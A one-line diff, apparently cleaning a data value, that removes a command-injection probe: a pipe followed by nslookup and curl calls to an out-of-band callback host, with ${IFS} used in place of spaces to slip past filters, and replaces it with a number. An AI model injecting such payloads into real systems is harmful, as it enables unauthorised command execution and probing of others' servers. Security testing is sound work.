@@ -1,1 +1,1 @@
-|(nslookup${IFS}-q${IFS}cname${IFS}hitjpqfmbbaomc739f.bxss.me||curl${IFS}hitjpqfmbbaomc739f.bxss.me)
+5559299662
